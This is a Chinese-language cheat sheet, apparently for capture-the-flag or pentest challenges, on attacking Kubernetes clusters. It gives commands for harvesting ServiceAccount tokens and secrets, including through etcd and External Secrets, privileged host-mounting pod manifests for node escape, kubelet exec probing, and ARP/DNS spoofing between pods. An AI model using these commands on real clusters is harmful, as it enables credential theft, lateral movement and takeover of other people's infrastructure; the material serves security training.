---
category: cloud
tags: [kubernetes, k8s, kubectl, pod, namespace, rbac, serviceaccount, kubelet, secret, etcd, api_server, ingress, network_policy, container, 容器编排, 集群枚举, 权限分析, 服务账户, 网络攻击]
triggers: [kubernetes, k8s, kubectl, pod, namespace, kube-system, kube-apiserver, kubelet, serviceaccount, service account token, rbac, role, clusterrole, rolebinding, secret, etcd, configmap, ingress, nodeport, loadbalancer, network policy, arp spoof, dns spoof, container escape, privileged pod, security context, external secret, 10250, 6443, 8443, /var/run/secrets/kubernetes.io, ca.crt, kubeconfig, .kube/config, kubectl auth can-i, api-resources]
related: [cloud/kubernetes_privesc, cloud/container_escape]
---

# Kubernetes 集群枚举与攻击

## 什么时候用

题目中出现了 `kubectl`、`pod`、`namespace`、`kube-system`、`serviceaccount`、`RBAC`、`etcd`、`kubelet`、`10250`、`6443`、`/var/run/secrets/kubernetes.io/serviceaccount`、`.kube/config` 等线索时，说明目标是一个 Kubernetes 集群环境。需要从"我在哪、我是谁、我能做什么"三个维度展开枚举。

典型场景：

- 拿到一个 Pod 内的 shell，需要横向移动或提权
- 获取了 kubeconfig 或 ServiceAccount token，需要枚举集群资源
- 发现 API Server / Kubelet 端口暴露在外，需要未授权访问
- 需要从 Secret / ConfigMap / etcd 中提取凭证

## 前提条件

- 至少拥有以下之一：Pod 内 shell、有效 ServiceAccount token、kubeconfig 文件、API Server 网络可达
- 了解集群的 API Server 地址（通常从环境变量 `KUBERNETES_SERVICE_HOST` 或 kubeconfig 获取）
- 可选：`kubectl` 二进制（没有也可用 `curl` 直接调 REST API）

## 攻击步骤

### 1. 确认身份与环境

**在 Pod 内获取 ServiceAccount token：**

```bash
# token 通常挂载在以下路径之一
ls /run/secrets/kubernetes.io/serviceaccount/
ls /var/run/secrets/kubernetes.io/serviceaccount/
ls /secrets/kubernetes.io/serviceaccount/

# 设置环境变量
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}

# 快速 curl alias
alias kurl="curl --cacert ${CACERT} --header 'Authorization: Bearer ${TOKEN}'"
```

**从宿主机获取凭证：**

```bash
# kubeconfig 位置
echo $KUBECONFIG
ls -la ~/.kube/config

# 配置 kubectl
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context
```

**配置 kubectl 使用 token：**

```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true'
```

### 2. 权限枚举（RBAC 分析）

这是最关键的一步——搞清楚当前身份能做什么。

```bash
# 当前身份的全部权限
k auth can-i --list
k auth can-i --list -n kube-system

# 模拟某个 ServiceAccount 的权限
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>

# 测试特定操作
k auth can-i get secrets -n default
k auth can-i create pods -n default
```

**用 curl 查权限（无 kubectl 时）：**

```bash
kurl -s -k -X POST \
  -H 'Content-Type: application/json' \
  --data '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","metadata":{"creationTimestamp":null},"spec":{"namespace":"default"},"status":{"resourceRules":null,"nonResourceRules":null,"incomplete":false}}' \
  "https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```

**RBAC 核心概念：**

| 对象 | 作用域 | 说明 |
|------|--------|------|
| Role | 单 Namespace | 定义 namespace 内的权限规则 |
| ClusterRole | 全集群 | 定义集群级权限（含非 namespace 资源） |
| RoleBinding | 单 Namespace | 将 Role/ClusterRole 绑定到主体 |
| ClusterRoleBinding | 全集群 | 将 ClusterRole 绑定到主体（全集群生效） |

**枚举 RBAC 对象：**

```bash
k get roles --all-namespaces
k get clusterroles
k get rolebindings --all-namespaces
k get clusterrolebindings
k describe clusterroles <role-name>
k describe clusterrolebindings <binding-name>
```

**HTTP Verb 与 K8s Verb 对应：**

| HTTP | K8s Verb |
|------|----------|
| POST | create |
| GET | get（单资源）、list（集合）、watch（监听） |
| PUT | update |
| PATCH | patch |
| DELETE | delete / deletecollection |

特殊 verb：`bind`、`escalate`（RBAC 提权）、`impersonate`（身份冒充）。

### 3. 集群资源枚举

```bash
# 全局概览
k get all --all-namespaces
k api-resources --namespaced=true
k api-resources --namespaced=false

# Namespace
k get namespaces

# Pods
k get pods --all-namespaces -o wide

# Services
k get services --all-namespaces

# Deployments
k get deployments --all-namespaces

# DaemonSets
k get daemonsets --all-namespaces

# CronJobs
k get cronjobs --all-namespaces

# Nodes
k get nodes -o wide

# ConfigMaps（常含密码、连接串）
k get configmaps --all-namespaces

# Network Policies
k get networkpolicies --all-namespaces
k get CiliumNetworkPolicies --all-namespaces 2>/dev/null

# ServiceAccounts
k get serviceaccounts --all-namespaces

# Helm 管理的资源
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```

**用 curl 枚举（无 kubectl 时）：**

```bash
kurl -k "https://$APISERVER/api/v1/namespaces/"
kurl -k "https://$APISERVER/api/v1/namespaces/default/pods/"
kurl -k "https://$APISERVER/api/v1/namespaces/default/secrets/"
kurl -k "https://$APISERVER/api/v1/namespaces/default/services/"
kurl -k "https://$APISERVER/apis/apps/v1/namespaces/default/deployments/"
```

### 4. Secret 提取

**通过 kubectl：**

```bash
k get secrets --all-namespaces
k get secrets -o yaml -n <namespace>

# 遍历所有 token 并测试权限
for token in $(k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7); do
  echo "=== $token ==="
  k --token $token auth can-i --list 2>/dev/null | head -20
  echo
done
```

**通过 etcd 直接读取（需要节点访问权限）：**

```bash
# 查找 etcd 连接信息
cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep etcd

# 连接 etcd 读取 secret
ETCDCTL_API=3 etcdctl \
  --cert /etc/kubernetes/pki/apiserver-etcd-client.crt \
  --key /etc/kubernetes/pki/apiserver-etcd-client.key \
  --cacert /etc/kubernetes/pki/etcd/ca.crt \
  --endpoints=https://127.0.0.1:2379 \
  get /registry/secrets/default/<secret-name>
```

**注意：etcd 中的 secret 默认明文存储**（base64 编码但不加密）。如果启用了 EncryptionConfiguration，存储值会以 `k8s:enc:aescbc:v1:` 为前缀。

### 5. Kubelet API 探测

Kubelet 默认监听 `10250`（HTTPS）和 `10255`（HTTP 只读，较老版本）。

```bash
# 匿名访问测试
curl -k https://<node-ip>:10250/pods
curl -k https://<node-ip>:10250/metrics
curl http://<node-ip>:10255/pods   # 只读端口（如开放）

# 用 token 访问
curl -k --header "Authorization: Bearer ${TOKEN}" \
  "https://<node-ip>:10250/pods"
```

**Kubelet 认证方式：**

| 方式 | 配置 | 说明 |
|------|------|------|
| Anonymous | `--anonymous-auth=true`（默认） | 匿名访问，用户名 `system:anonymous` |
| Webhook | `--authentication-token-webhook` | 通过 API Server 验证 Bearer token |
| X509 | `--client-ca-file` | 客户端证书认证 |

**Kubelet 授权：默认 `AlwaysAllow`**（允许所有请求），生产环境通常配为 `Webhook`。

Kubelet API 端点对应的 RBAC 资源：

| 端点 | resource | subresource |
|------|----------|-------------|
| /stats/* | nodes | stats |
| /metrics/* | nodes | metrics |
| /logs/* | nodes | log |
| /spec/* | nodes | spec |
| 其他（/exec /run /attach） | nodes | proxy |

⚠️ `/exec`、`/run`、`/attach`、`/portforward` 走 WebSocket，属于 `nodes/proxy` 子资源。拥有 `nodes/proxy` GET 权限即可在容器内执行命令。

### 6. 服务暴露面枚举

```bash
# 自动枚举所有暴露的服务
kubectl get namespace -o custom-columns='NAME:.metadata.name' | grep -v NAME | while IFS='' read -r ns; do
    echo "Namespace: $ns"
    kubectl get service -n "$ns"
    kubectl get ingress -n "$ns"
    echo "=============================================="
done | grep -v "ClusterIP"
```

**服务类型对比：**

| 类型 | 可达范围 | 攻击面 |
|------|----------|--------|
| ClusterIP | 集群内部 | 需先进入集群 |
| NodePort | 节点 IP:30000-32767 | 直接从外部可达 |
| LoadBalancer | 云 LB 分配的外部 IP | 公网可达 |
| ExternalName | DNS CNAME 映射 | 内部重定向 |
| Ingress | HTTP/HTTPS 路由 | 路径/域名路由 |

```bash
# 列出各类型服务
kubectl get services --all-namespaces | grep NodePort
kubectl get services --all-namespaces | grep LoadBalancer
kubectl get services --all-namespaces | grep ExternalName
kubectl get ingresses --all-namespaces -o yaml
```

### 7. 创建特权 Pod（逃逸到节点）

**挂载宿主机文件系统：**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: default
spec:
  volumes:
    - name: host-fs
      hostPath:
        path: /
  containers:
    - image: ubuntu
      name: attacker-pod
      command: ["/bin/sh", "-c", "sleep infinity"]
      volumeMounts:
        - name: host-fs
          mountPath: /host
  restartPolicy: Never
```

```bash
kubectl apply -f attacker.yaml
kubectl exec -it attacker-pod -- bash
chroot /host /bin/bash
```

**全特权 Pod（hostNetwork + hostPID + privileged）：**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: pwned-pod
  labels:
    app: pentest
spec:
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
    - name: pwned
      image: alpine
      securityContext:
        privileged: true
      volumeMounts:
        - mountPath: /host
          name: noderoot
      command: ["/bin/sh", "-c", "sleep infinity"]
  volumes:
    - name: noderoot
      hostPath:
        path: /
```

### 8. 网络层攻击

**同节点 Pod 间 ARP 欺骗：**

同节点的所有 Pod 通过 `cbr0` 网桥通信，二层可达，因此可进行 ARP 欺骗。

```bash
apt install -y dsniff
arpspoof -t <victim-pod-ip> <target-pod-ip>
```

**DNS 欺骗：**

如果攻击者 Pod 与 DNS 服务器（CoreDNS）在同节点，可通过 ARP 欺骗拦截 DNS 请求并篡改响应。

```bash
# 使用 kube-dnsspoof 工具
# https://github.com/danielsagi/kube-dnsspoof/
echo "evil.com. <attacker-ip>" > hosts
python3 exploit.py --direct <victim-pod-ip>
```

**通过 CoreDNS ConfigMap 篡改（需写权限）：**

如果拥有 `kube-system` namespace 下 `coredns` ConfigMap 的写权限，可直接修改集群 DNS 解析。

**枚举网络策略：**

```bash
kubectl get networkpolicies --all-namespaces
kubectl get globalnetworkpolicy --all-namespaces 2>/dev/null        # Calico
kubectl get ciliumnetworkpolicy --all-namespaces 2>/dev/null        # Cilium
kubectl get crd | grep -i policy
```

### 9. External Secret Operator（ESO）利用

如果集群使用 ESO 管理外部密钥，可尝试窃取。

```bash
# 枚举 ClusterSecretStore
kubectl get ClusterSecretStore

# 枚举 ExternalSecret
kubectl get externalsecret -A | grep <store-name>

# 查看具体的 ExternalSecret 定义
kubectl get externalsecret <name> -n <namespace> -o yaml
```

在自己控制的 namespace 中创建 ExternalSecret 引用同一个 ClusterSecretStore，即可将目标 secret 同步到攻击者 namespace。

## 常见坑

- **匿名访问 ≠ 无权限**：Kubelet 默认匿名认证开启，但授权模式如果是 Webhook，匿名用户可能什么都做不了
- **`list` 和 `get` 是两种不同权限**：有 `get` 但没 `list` 时，必须知道资源名才能查看；有 `list` 才能枚举
- **Secret 值是 base64 编码不是加密**：`kubectl get secret -o yaml` 拿到的值需要 base64 解码
- **Pod 内 DNS 解析走 Service IP → 网桥转发**：即使 DNS Pod 和你在同网段，请求也经过网桥，这使 ARP 欺骗成为可能
- **etcd 默认明文存储 Secret**：除非管理员配置了 EncryptionConfiguration
- **kubeconfig 中可能存有多个 context**：别忘了检查所有 context，某些可能权限更高
- **`--insecure-skip-tls-verify`**：测试时常用但容易遗忘，curl 用 `-k`

## 变体

- **暴露的 API Server**：6443 端口直接可达，匿名或弱认证
- **暴露的 Kubelet**：10250 端口 `--anonymous-auth=true` + `AlwaysAllow`，可直接 exec 进容器
- **暴露的 etcd**：2379 端口无认证，可直接读取全部集群数据
- **Dashboard 未授权**：Kubernetes Dashboard 配置了 skip-login 或绑定了高权限 ServiceAccount
- **Helm Tiller**：旧版 Helm 2 的 Tiller 组件拥有集群管理员权限
- **云托管 K8s**：EKS/GKE/AKS 的 metadata API（169.254.169.254）可能泄露节点凭证
- **SecurityContext 配错**：`privileged: true`、`hostPID: true`、`hostNetwork: true` 等配置导致容器逃逸

## 相关技术

- [[cloud/kubernetes_privesc]] — 利用 RBAC 错配、特权 Pod、ServiceAccount token 进行集群提权
- [[cloud/container_escape]] — 从容器内逃逸到宿主机节点
